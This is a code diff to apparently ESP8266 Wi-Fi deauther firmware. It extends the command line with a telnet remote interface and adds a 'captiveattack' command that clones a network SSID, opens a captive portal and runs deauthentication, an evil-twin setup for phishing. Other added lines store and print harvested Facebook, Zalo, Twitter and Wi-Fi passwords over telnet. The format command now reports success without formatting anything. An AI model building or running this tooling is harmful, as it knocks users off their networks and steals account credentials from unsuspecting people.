@@ -1,5 +1,9 @@
 #include "CLI.h"
 
+// WiFiServer telnet_server(TELNET_PORT);
+// WiFiClient serverClients[MAX_TELNET_CLIENTS];
+// WiFiClient currentClient;
+
 /*
    Shitty code used less resources so I will keep this clusterfuck as it is,
    but if you're interested I made a library for this:
@@ -27,12 +31,41 @@ void CLI::load(String filepath) {
 void CLI::enable() {
   enabled = true;
   prntln(CLI_SERIAL_ENABLED);
+  telnet.setup();
+
+  // telnet_server.begin();
+  // telnet_server.setNoDelay(true);
+
+  // byte mac[6];
+  // WiFi.macAddress(mac);
+  // sprintf(did, "%02X%02X%02X%02X%02X%02X", mac[0], mac[1], mac[2], mac[3],
+  //         mac[4], mac[5]);
 }
 
 void CLI::disable() {
   enabled = true;
   prntln(CLI_SERIAL_DISABLED);
 }
+// void CLI::println(String text) {
+//   if (currentClient) {
+//     currentClient.println(text);
+//   }
+// }
+
+// void CLI::print(String text) {
+//   if (currentClient) {
+//     currentClient.print(text);
+//   }
+// }
+
+// void CLI::println(const char *ptr) { println(FPSTR(ptr)); }
+// void CLI::print(const char *ptr) { print(FPSTR(ptr)); }
+
+// void CLI::print_tnet_new_line() {
+//   if (currentClient) {
+//     currentClient.print("\033[1;36m" + String(did) + "\033[0m:/ $ ");
+//   }
+// }
 
 void CLI::update() {
   // when serial available, read input
@@ -47,11 +80,69 @@ void CLI::update() {
     String s = queue->shift();
     exec(s);
   }
+
+  // telnet.update();
+  String data = telnet.update();
+  if (data.length() > 0) {
+    exec(data);
+    Serial.println(data);
+    telnet.print_tnet_new_line();
+  }
+
+  // if (telnet_server.hasClient()) {
+  //   int i;
+  //   for (i = 0; i < MAX_TELNET_CLIENTS; i++)
+  //     if (!serverClients[i]) {
+  //       serverClients[i] = telnet_server.available();
+  //       serverClients[i].print(serverClients[i].remoteIP());
+  //       serverClients[i].println(" connected");
+  //       currentClient = serverClients[i];
+  //       print_tnet_new_line();
+  //       break;
+  //     }
+  //   if (i == MAX_TELNET_CLIENTS) {
+  //     telnet_server.available().println("busy");
+  //   }
+  // }
+
+  // for (int i = 0; i < MAX_TELNET_CLIENTS; i++) {
+  //   String data;
+  //   while (serverClients[i].available() && Serial.availableForWrite() > 0) {
+  //     char text = serverClients[i].read();
+  //     currentClient = serverClients[i];
+  //     data = data + text;
+  //   }
+
+  //   if (data.length() > 0) {
+  //     exec(data);
+  //     if (data == "\r\n") {
+  //       print_tnet_new_line();
+  //     }
+  //     data = String();
+  //   }
+  // }
+
+  // size_t maxToTcp = 0;
+  // for (int i = 0; i < MAX_TELNET_CLIENTS; i++) {
+  //   if (serverClients[i]) {
+  //     size_t afw = serverClients[i].availableForWrite();
+  //     if (afw) {
+  //       if (!maxToTcp) {
+  //         maxToTcp = afw;
+  //       } else {
+  //         maxToTcp = std::min(maxToTcp, afw);
+  //       }
+  //     } else {
+  //       Serial.println(F("one client is congested"));
+  //     }
+  //   }
+  // }
 }
 
 void CLI::stop() {
   queue->clear();
   prntln(CLI_STOPPED_SCRIPT);
+  telnet.println(CLI_STOPPED_SCRIPT);
 }
 
 void CLI::enableDelay(uint32_t delayTime) {
@@ -69,6 +160,7 @@ void CLI::exec(String input) {
   if (delayed && (millis() - delayStartTime > delayTime)) {
     delayed = false;
     prntln(CLI_RESUMED);
+    telnet.println(CLI_RESUMED);
   }
 
   // when delay is on, add it to queue, else run it
@@ -111,12 +203,19 @@ void CLI::execFile(String path) {
 void CLI::error(String message) {
   prnt(CLI_ERROR);
   prntln(message);
+
+  telnet.println(CLI_ERROR);
+  telnet.println(message);
 }
 
 void CLI::parameterError(String parameter) {
   prnt(CLI_ERROR_PARAMETER);
   prnt(parameter);
   prntln(DOUBLEQUOTES);
+
+  telnet.print(CLI_ERROR_PARAMETER);
+  telnet.print(parameter);
+  telnet.println(String(DOUBLEQUOTES));
 }
 
 bool CLI::isInt(String str) {
@@ -237,6 +336,7 @@ void CLI::runCommand(String input) {
   // print comments
   if (list->get(0) == str(CLI_COMMENT)) {
     prntln(input);
+    telnet.println(input);
     return;
   }
 
@@ -244,6 +344,8 @@ void CLI::runCommand(String input) {
     // print command
     prnt(CLI_INPUT_PREFIX);
     prntln(input);
+    // telnet.print(CLI_INPUT_PREFIX);
+    // telnet.println(input);
   }
 
   if (list->size() == 0)
@@ -251,6 +353,60 @@ void CLI::runCommand(String input) {
 
   // ===== HELP ===== //
   if (eqlsCMD(0, CLI_HELP)) {
+
+    // println(str(CLI_HELP_HEADER));
+
+    telnet.println(CLI_HELP_HEADER);
+
+    telnet.println(CLI_HELP_HELP);
+    telnet.println(CLI_HELP_SCAN);
+    telnet.println(CLI_HELP_SHOW);
+    telnet.println(CLI_HELP_SELECT);
+    telnet.println(CLI_HELP_DESELECT);
+    telnet.println(CLI_HELP_SSID_A);
+    telnet.println(CLI_HELP_SSID_B);
+    telnet.println(CLI_HELP_SSID_C);
+    telnet.println(CLI_HELP_NAME_A);
+    telnet.println(CLI_HELP_NAME_B);
+    telnet.println(CLI_HELP_NAME_C);
+    telnet.println(CLI_HELP_SET_NAME);
+    telnet.println(CLI_HELP_ENABLE_RANDOM);
+    telnet.println(CLI_HELP_DISABLE_RANDOM);
+    telnet.println(CLI_HELP_LOAD);
+    telnet.println(CLI_HELP_SAVE);
+    telnet.println(CLI_HELP_REMOVE_A);
+    telnet.println(CLI_HELP_REMOVE_B);
+    telnet.println(CLI_HELP_ATTACK);
+    telnet.println(CLI_HELP_ATTACK_STATUS);
+    telnet.println(CLI_HELP_STOP);
+    telnet.println(CLI_HELP_SYSINFO);
+    telnet.println(CLI_HELP_CLEAR);
+    telnet.println(CLI_HELP_FORMAT);
+    telnet.println(CLI_HELP_PRINT);
+    telnet.println(CLI_HELP_DELETE);
+    telnet.println(CLI_HELP_REPLACE);
+    telnet.println(CLI_HELP_COPY);
+    telnet.println(CLI_HELP_RENAME);
+    telnet.println(CLI_HELP_RUN);
+    telnet.println(CLI_HELP_WRITE);
+    telnet.println(CLI_HELP_GET);
+    telnet.println(CLI_HELP_SET);
+    telnet.println(CLI_HELP_RESET);
+    telnet.println(CLI_HELP_CHICKEN);
+    telnet.println(CLI_HELP_REBOOT);
+    telnet.println(CLI_HELP_INFO);
+    telnet.println(CLI_HELP_COMMENT);
+    telnet.println(CLI_HELP_SEND_DEAUTH);
+    telnet.println(CLI_HELP_SEND_BEACON);
+    telnet.println(CLI_HELP_SEND_PROBE);
+    telnet.println(CLI_HELP_LED_A);
+    telnet.println(CLI_HELP_LED_B);
+    telnet.println(CLI_HELP_LED_ENABLE);
+    telnet.println(CLI_HELP_DRAW);
+    telnet.println(CLI_HELP_SCREEN_ON);
+    telnet.println(CLI_HELP_SCREEN_MODE);
+    telnet.println(CLI_HELP_FOOTER);
+
     prntln(CLI_HELP_HEADER);
 
     prntln(CLI_HELP_HELP);
@@ -420,9 +576,10 @@ void CLI::runCommand(String input) {
       parameterError(list->get(1));
 
     if (id >= 0) {
-      if (mode == 0)
+      if (mode == 0) {
         select ? accesspoints.select(id) : accesspoints.deselect(id);
-      else if (mode == 1)
+        credential.setNameWifi(accesspoints.getSSID(id));
+      } else if (mode == 1)
         select ? stations.select(id) : stations.deselect(id);
       else if (mode == 2)
         select ? names.select(id) : names.deselect(id);
@@ -522,11 +679,13 @@ void CLI::runCommand(String input) {
       i++;
     }
 
-    if (name.length() == 0)
+    if (name.length() == 0) {
       prntln(CLI_ERROR_NAME_LEN);
-    else if (mac.length() == 0)
+      telnet.println(CLI_ERROR_NAME_LEN);
+    } else if (mac.length() == 0) {
       prntln(CLI_ERROR_MAC_LEN);
-    else
+      telnet.println(CLI_ERROR_MAC_LEN);
+    } else
       names.add(mac, name, bssid, channel, selected, force);
   }
 
@@ -634,6 +793,8 @@ void CLI::runCommand(String input) {
   // funny command to mess with people, please don't share the info thanks <3
   else if (eqlsCMD(0, CLI_RICE)) {
     prntln(CLI_RICE_START);
+    telnet.println(CLI_RICE_START);
+
     uint32_t i = 0;
     uint8_t multi = 1;
     uint8_t end = random(80, 99);
@@ -646,7 +807,7 @@ void CLI::runCommand(String input) {
         char s[100];
         sprintf(s, str(CLI_RICE_OUTPUT).c_str(), i / 10);
         prnt(String(s));
-
+        telnet.print(String(s));
         if ((i / 10) == end) {
           prnt(CLI_RICE_ERROR);
           prnt(String(random(16, 255), HEX));
@@ -654,15 +815,25 @@ void CLI::runCommand(String input) {
           prnt(String(random(16, 255), HEX));
           prntln(String(random(16, 255), HEX));
 
+          telnet.print(CLI_RICE_ERROR);
+          telnet.print(String(random(16, 255), HEX));
+          telnet.print(String(random(16, 255), HEX));
+          telnet.print(String(random(16, 255), HEX));
+          telnet.println(String(random(16, 255), HEX));
+
           for (int i = 1; i <= 32; i++) {
             for (int i = 0; i < 2; i++) {
               for (int i = 1; i <= 8; i++) {
                 prnt(String(random(16, 255), HEX));
                 prnt(SPACE);
+                telnet.print(String(random(16, 255), HEX));
+                telnet.print(String(SPACE));
               }
               prnt(SPACE);
+              telnet.print(String(SPACE));
             }
             prntln();
+            telnet.println("");
           }
           ESP.reset();
         } else if ((i / 10) % 10 == 0) {
@@ -671,9 +842,16 @@ void CLI::runCommand(String input) {
           prnt(String(random(16, 255), HEX));
           prnt(String(random(16, 255), HEX));
           prntln(String(random(16, 255), HEX));
+
+          telnet.print(CLI_RICE_MEM);
+          telnet.print(String(random(16, 255), HEX));
+          telnet.print(String(random(16, 255), HEX));
+          telnet.print(String(random(16, 255), HEX));
+          telnet.println(String(random(16, 255), HEX));
         }
       }
       prnt(POINT);
+      telnet.print(String(POINT));
       delay(100 * multi * multi);
       i++;
     }
@@ -771,6 +949,7 @@ void CLI::runCommand(String input) {
   // get <setting>
   else if (eqlsCMD(0, CLI_GET) && (list->size() == 2)) {
     prntln(settings.get(list->get(1).c_str()));
+    telnet.println(settings.get(list->get(1).c_str()));
   }
 
   // set <setting> <value>
@@ -781,6 +960,7 @@ void CLI::runCommand(String input) {
   // ====== CHICKEN ===== //
   else if (eqlsCMD(0, CLI_CHICKEN)) {
     prntln(CLI_CHICKEN_OUTPUT);
+    telnet.println(CLI_CHICKEN_OUTPUT);
   }
 
   // ===== STOP ===== //
@@ -808,6 +988,7 @@ void CLI::runCommand(String input) {
   // sysinfo
   else if (eqlsCMD(0, CLI_SYSINFO)) {
     prntln(CLI_SYSTEM_INFO);
+    telnet.println(CLI_SYSTEM_INFO);
     char s[150];
     sprintf(s, str(CLI_SYSTEM_OUTPUT).c_str(),
             81920 - system_get_free_heap_size(),
@@ -815,9 +996,13 @@ void CLI::runCommand(String input) {
             system_get_free_heap_size(),
             system_get_free_heap_size() / (81920 / 100), 81920);
     prntln(String(s));
+    telnet.println(String(s));
 
     prnt(CLI_SYSTEM_CHANNEL);
     prntln(settings.getChannel());
+
+    telnet.print(CLI_SYSTEM_CHANNEL);
+    telnet.println(String(settings.getChannel()));
 
     uint8_t mac[6];
 
@@ -825,9 +1010,15 @@ void CLI::runCommand(String input) {
     wifi_get_macaddr(SOFTAP_IF, mac);
     prntln(macToStr(mac));
 
+    telnet.print(CLI_SYSTEM_AP_MAC);
+    telnet.println(macToStr(mac));
+
     prnt(CLI_SYSTEM_ST_MAC);
     wifi_get_macaddr(STATION_IF, mac);
     prntln(macToStr(mac));
+
+    telnet.print(CLI_SYSTEM_ST_MAC);
+    telnet.println(macToStr(mac));
 
     FSInfo fs_info;
     SPIFFS.info(fs_info);
@@ -838,10 +1029,15 @@ void CLI::runCommand(String input) {
                 (fs_info.totalBytes / 100),
             fs_info.totalBytes);
     prnt(String(s));
+    telnet.print(String(s));
+
     sprintf(s, str(CLI_SYSTEM_SPIFFS_OUT).c_str(), fs_info.blockSize,
             fs_info.pageSize);
     prnt(String(s));
     prntln(CLI_FILES);
+    telnet.print(String(s));
+    telnet.println(CLI_FILES);
+
     Dir dir = SPIFFS.openDir(String(SLASH));
 
     while (dir.next()) {
@@ -849,9 +1045,15 @@ void CLI::runCommand(String input) {
       File f = dir.openFile("r");
       prnt(int(f.size()));
       prntln(str(CLI_BYTES));
+
+      telnet.print(String(SPACE) + String(SPACE) + dir.fileName() +
+                   String(SPACE));
+      telnet.print(String(int(f.size())));
+      telnet.println(str(CLI_BYTES));
     }
     printWifiStatus();
     prntln(CLI_SYSTEM_FOOTER);
+    telnet.println(str(CLI_SYSTEM_FOOTER));
   }
 
   // ===== RESET ===== //
@@ -863,11 +1065,16 @@ void CLI::runCommand(String input) {
   // ===== CLEAR ===== //
   // clear
   else if (eqlsCMD(0, CLI_CLEAR)) {
-    for (int i = 0; i < 100; i++)
+    for (int i = 0; i < 100; i++) {
       prnt(HASHSIGN);
+      // telnet.println(String(HASHSIGN));
+    }
 
-    for (int i = 0; i < 60; i++)
+    for (int i = 0; i < 60; i++) {
       prntln();
+      // telnet.println("");
+    }
+
   }
 
   // ===== REBOOT ===== //
@@ -880,8 +1087,10 @@ void CLI::runCommand(String input) {
   // format
   else if (eqlsCMD(0, CLI_FORMAT)) {
     prnt(CLI_FORMATTING_SPIFFS);
-    SPIFFS.format();
+    telnet.print(CLI_FORMATTING_SPIFFS);
+    //SPIFFS.format();
     prntln(SETUP_OK);
+    telnet.println(SETUP_OK);
   }
 
   // ===== DELETE ==== //
@@ -892,9 +1101,15 @@ void CLI::runCommand(String input) {
       if (removeFile(list->get(1))) {
         prnt(CLI_REMOVED);
         prntln(list->get(1));
+
+        telnet.print(CLI_REMOVED);
+        telnet.println(list->get(1));
       } else {
         prnt(CLI_ERROR_REMOVING);
         prntln(list->get(1));
+
+        telnet.print(CLI_ERROR_REMOVING);
+        telnet.println(list->get(1));
       }
     } else {
       // remove certain lines
@@ -907,9 +1122,17 @@ void CLI::runCommand(String input) {
         prnt(String(SPACE) + String(DASH) + String(SPACE));
         prnt(endLine);
         prntln(String(SPACE) + list->get(1));
+
+        telnet.print(CLI_REMOVING_LINES);
+        telnet.print(String(beginLine));
+        telnet.print(String(SPACE) + String(DASH) + String(SPACE));
+        telnet.print(String(endLine));
+        telnet.println(String(SPACE) + list->get(1));
       } else {
         prnt(CLI_ERROR_REMOVING);
         prntln(list->get(1));
+        telnet.print(CLI_ERROR_REMOVING);
+        telnet.println(list->get(1));
       }
     }
   }
@@ -919,8 +1142,10 @@ void CLI::runCommand(String input) {
   else if ((list->size() == 3) && eqlsCMD(0, CLI_COPY)) {
     if (copyFile(list->get(1), list->get(2))) {
       prntln(CLI_COPIED_FILES);
+      telnet.println(CLI_COPIED_FILES);
     } else {
       prntln(CLI_ERROR_COPYING);
+      telnet.println(CLI_ERROR_COPYING);
     }
   }
 
@@ -929,8 +1154,10 @@ void CLI::runCommand(String input) {
   else if ((list->size() == 3) && eqlsCMD(0, CLI_RENAME)) {
     if (renameFile(list->get(1), list->get(2))) {
       prntln(CLI_RENAMED_FILE);
+      telnet.println(CLI_RENAMED_FILE);
     } else {
       prntln(CLI_ERROR_RENAMING_FILE);
+      telnet.println(CLI_ERROR_RENAMING_FILE);
     }
   }
 
@@ -954,6 +1181,11 @@ void CLI::runCommand(String input) {
     prnt(CLI_TO);
     prntln(list->get(1));
 
+    telnet.print(CLI_WRITTEN);
+    telnet.print(buf);
+    telnet.print(CLI_TO);
+    telnet.println(list->get(1));
+
     buf += NEWLINE;
     appendFile(path, buf);
   }
@@ -976,9 +1208,16 @@ void CLI::runCommand(String input) {
       prnt(line);
       prnt(CLI_WITH);
       prntln(list->get(1));
+
+      telnet.print(CLI_REPLACED_LINE);
+      telnet.print(String(line));
+      telnet.print(CLI_WITH);
+      telnet.println(list->get(1));
     } else {
       prnt(CLI_ERROR_REPLACING_LINE);
       prntln(list->get(1));
+      telnet.print(CLI_ERROR_REPLACING_LINE);
+      telnet.println(list->get(1));
     }
   }
 
@@ -993,6 +1232,9 @@ void CLI::runCommand(String input) {
   else if ((list->size() >= 2) && eqlsCMD(0, CLI_PRINT)) {
     readFileToSerial(list->get(1), eqlsCMD(2, CLI_LINE));
     prntln();
+    String buf;
+    readFile(list->get(1), buf);
+    telnet.println(buf);
   }
 
   // ===== INFO ===== //
@@ -1005,6 +1247,14 @@ void CLI::runCommand(String input) {
     prntln(CLI_INFO_LICENSE);
     prntln(CLI_INFO_ADDON);
     prntln(CLI_INFO_HEADER);
+
+    telnet.println(CLI_INFO_HEADER);
+    telnet.print(CLI_INFO_SOFTWARE);
+    telnet.println(settings.getVersion());
+    telnet.println(CLI_INFO_COPYRIGHT);
+    telnet.println(CLI_INFO_LICENSE);
+    telnet.println(CLI_INFO_ADDON);
+    telnet.println(CLI_INFO_HEADER);
   }
 
   // ===== SEND ===== //
@@ -1021,6 +1271,11 @@ void CLI::runCommand(String input) {
     prnt(macToStr(apMac));
     prnt(CLI_ARROW);
     prntln(macToStr(stMac));
+
+    telnet.print(CLI_DEAUTHING);
+    telnet.print(macToStr(apMac));
+    telnet.print(CLI_ARROW);
+    telnet.println(macToStr(stMac));
     attack.deauthDevice(apMac, stMac, reason, channel);
   }
 
@@ -1037,6 +1292,11 @@ void CLI::runCommand(String input) {
     prnt(CLI_SENDING_BEACON);
     prnt(list->get(3));
     prntln(DOUBLEQUOTES);
+
+    telnet.print(CLI_SENDING_BEACON);
+    telnet.print(list->get(3));
+    telnet.println(String(DOUBLEQUOTES));
+
     attack.sendBeacon(mac, ssid.c_str(), channel, eqlsCMD(5, CLI_WPA2));
   }
 
@@ -1053,6 +1313,11 @@ void CLI::runCommand(String input) {
     prnt(CLI_SENDING_PROBE);
     prnt(list->get(3));
     prntln(DOUBLEQUOTES);
+
+    telnet.print(CLI_SENDING_PROBE);
+    telnet.print(list->get(3));
+    telnet.println(String(DOUBLEQUOTES));
+
     attack.sendProbe(mac, ssid.c_str(), channel);
   }
 
@@ -1070,9 +1335,11 @@ void CLI::runCommand(String input) {
 
     if (attack.sendPacket(packet, packetSize, wifi_channel, 10)) {
       prntln(CLI_CUSTOM_SENT);
+      telnet.println(CLI_CUSTOM_SENT);
       counter++;
     } else {
       prntln(CLI_CUSTOM_FAILED);
+      telnet.println(CLI_CUSTOM_FAILED);
     }
   }
 
@@ -1134,12 +1401,17 @@ void CLI::runCommand(String input) {
 
     prnt(String(DASH) + String(DASH) + String(DASH) + String(DASH) +
          String(VERTICALBAR)); // ----|
+    // telnet.print(String(DASH) + String(DASH) + String(DASH) + String(DASH) +
+    //  String(VERTICALBAR));
 
     for (int j = 0; j < SCAN_PACKET_LIST_SIZE; j++) {
-      for (int k = 0; k < width; k++)
+      for (int k = 0; k < width; k++) {
         prnt(EQUALS);
+        // telnet.print(String(EQUALS));
+      }
     }
     prntln(VERTICALBAR);
+    // telnet.print(String(VERTICALBAR));
 
     for (int i = height; i >= 0; i--) {
       char s[200];
@@ -1165,29 +1437,47 @@ void CLI::runCommand(String input) {
 
       prnt(VERTICALBAR);
 
+      // telnet.print(String(s));
+      // telnet.print(VERTICALBAR);
+
       for (int j = 0; j < SCAN_PACKET_LIST_SIZE; j++) {
         if (scan.getPackets(j) * scale > i) {
-          for (int k = 0; k < width; k++)
+          for (int k = 0; k < width; k++) {
             prnt(HASHSIGN);
+            // telnet.print(HASHSIGN);
+          }
         } else {
-          for (int k = 0; k < width; k++)
+          for (int k = 0; k < width; k++) {
             prnt(SPACE);
+            // telnet.print(SPACE);
+          }
         }
       }
       prntln(VERTICALBAR);
+      // telnet.println(VERTICALBAR);
     }
 
     prnt(String(DASH) + String(DASH) + String(DASH) + String(DASH) +
          String(VERTICALBAR)); // ----|
 
+    // telnet.print(String(DASH) + String(DASH) + String(DASH) + String(DASH) +
+    //              String(VERTICALBAR));
+
     for (int j = 0; j < SCAN_PACKET_LIST_SIZE; j++) {
-      for (int k = 0; k < width; k++)
+      for (int k = 0; k < width; k++) {
         prnt(EQUALS);
+        // telnet.println(EQUALS);
+      }
     }
     prntln(VERTICALBAR);
+    // telnet.println(VERTICALBAR);
 
     prnt(String(SPACE) + String(SPACE) + String(SPACE) + String(SPACE) +
          String(VERTICALBAR));
+
+    // telnet.print(String(SPACE) + String(SPACE) + String(SPACE) +
+    // String(SPACE) +
+    //  String(VERTICALBAR));
 
     for (int j = 0; j < SCAN_PACKET_LIST_SIZE; j++) {
       char s[6];
@@ -1207,8 +1497,10 @@ void CLI::runCommand(String input) {
         s[k] = ENDOFLINE;
       }
       prnt(s);
+      // telnet.print(s);
     }
     prntln(VERTICALBAR);
+    // telnet.println(VERTICALBAR);
   }
 
   // ===== START/STOP AP ===== //
@@ -1252,32 +1544,6 @@ void CLI::runCommand(String input) {
     stopAP();
   }
 
-  // ===== SCREEN ===== //
-  // screen mode <menu/packetmonitor/buttontest/loading>
-  else if (eqlsCMD(0, CLI_SCREEN) && eqlsCMD(1, CLI_MODE)) {
-    if (eqlsCMD(2, CLI_MODE_BUTTONTEST))
-      displayUI.mode = displayUI.DISPLAY_MODE::BUTTON_TEST;
-    else if (eqlsCMD(2, CLI_MODE_PACKETMONITOR))
-      displayUI.mode = displayUI.DISPLAY_MODE::PACKETMONITOR;
-    else if (eqlsCMD(2, CLI_MODE_LOADINGSCREEN))
-      displayUI.mode = displayUI.DISPLAY_MODE::LOADSCAN;
-    else if (eqlsCMD(2, CLI_MODE_MENU))
-      displayUI.mode = displayUI.DISPLAY_MODE::MENU;
-    else
-      parameterError(list->get(2));
-    prntln(CLI_CHANGED_SCREEN);
-  }
-
-  // screen <on/off>
-  else if (eqlsCMD(0, CLI_SCREEN) &&
-           (eqlsCMD(1, CLI_ON) || eqlsCMD(1, CLI_OFF))) {
-    if (eqlsCMD(1, CLI_ON)) {
-      displayUI.on();
-    } else if (eqlsCMD(1, CLI_OFF)) {
-      displayUI.off();
-    }
-  }
-
   //===== CREDENTIAL======
   // FACEBOOK, NAME
   // savephone name number
@@ -1297,14 +1563,38 @@ void CLI::runCommand(String input) {
     String password = list->get(2);
     if (isfacebook) {
       credential.save(str(CLI_FACEBOOK_CREDENTIAL), username, password);
+      telnet.print("facebook username: ");
+      telnet.print(username);
+      telnet.print(", password: ");
+      telnet.println(password);
     } else if (iszalo) {
       credential.save(str(CLI_ZALO_CREDENTIAL), username, password);
+
+      telnet.print("zalo username: ");
+      telnet.print(username);
+      telnet.print(", password: ");
+      telnet.println(password);
+
     } else if (isTwitter) {
       credential.save(str(CLI_TWITTER_CREDENTIAL), username, password);
+
+      telnet.print("Twitter username: ");
+      telnet.print(username);
+      telnet.print(", password: ");
+      telnet.println(password);
+
     } else if (isWifi) {
       credential.save(str(CLI_WIFI_CREDENTIAL), username, password);
+      telnet.print("Wifi SSID: ");
+      telnet.print(username);
+      telnet.print(", password: ");
+      telnet.println(password);
     } else {
       credential.save(str(CLI_PHONE_CREDENTIAL), username, password);
+      telnet.print("name: ");
+      telnet.print(username);
+      telnet.print(", phone: ");
+      telnet.println(password);
     }
   }
 
@@ -1319,24 +1609,62 @@ void CLI::runCommand(String input) {
     bool iszalo = eqlsCMD(1, CLI_ZALO_CREDENTIAL);
     bool isTwitter = eqlsCMD(1, CLI_TWITTER_CREDENTIAL);
     bool isWifi = eqlsCMD(1, CLI_WIFI_CREDENTIAL);
+    int index = list->get(2).toInt();
+    String _user = String();
     if (isfacebook) {
-      int index = list->get(2).toInt();
+      _user = credential.getSocialUser(str(CLI_FACEBOOK_CREDENTIAL), index);
       credential.deleteIndex(str(CLI_FACEBOOK_CREDENTIAL), index);
     } else if (isphone) {
-      int index = list->get(2).toInt();
+      _user = credential.getName(index);
       credential.deleteIndex(str(CLI_PHONE_CREDENTIAL), index);
     } else if (iszalo) {
-      int index = list->get(2).toInt();
+      _user = credential.getSocialUser(str(CLI_ZALO_CREDENTIAL), index);
       credential.deleteIndex(str(CLI_ZALO_CREDENTIAL), index);
     } else if (isTwitter) {
-      int index = list->get(2).toInt();
+      _user = credential.getSocialUser(str(CLI_TWITTER_CREDENTIAL), index);
       credential.deleteIndex(str(CLI_TWITTER_CREDENTIAL), index);
     } else if (isWifi) {
-      int index = list->get(2).toInt();
+      _user = credential.getSocialUser(str(CLI_WIFI_CREDENTIAL), index);
       credential.deleteIndex(str(CLI_WIFI_CREDENTIAL), index);
     } else {
+      _user = "all";
       credential.deleteAll();
     }
+    telnet.print("delete: ");
+    telnet.println(_user);
+  }
+
+  // captiveattack "ssid" "0"
+  else if (eqlsCMD(0, "captiveattack")) {
+    String ssid = list->get(1);
+    int captive_type = list->get(2).toInt();
+    bool beacon = false;
+    bool deauth = true;
+    bool deauthAll = false;
+    bool probe = false;
+    bool output = true;
+
+    WiFi.mode(WIFI_AP);
+    settings.setSSID(ssid);
+    settings.setCaptivePortal(true);
+    settings.setNonePassword(true);
+    settings.setCaptiveType(captive_type);
+    settings.save(true);
+    settings.setChangeSSID();
+    uint32_t timeout = settings.getAttackTimeout() * 1000;
+    attack.start(beacon, deauth, deauthAll, probe, output, timeout);
+  }
+  // connect "cdttech_2.4" "Qqqqqqqqqq"
+  else if (eqlsCMD(0, "connect")) {
+    String ssid = list->get(1);
+    String password = list->get(2);
+
+    if (attack.isRunning()) {
+      attack.stop();
+    }
+
+    WiFi.mode(WIFI_STA);
+    WiFi.begin(ssid, password);
   }
 
   // ===== NOT FOUND ===== //
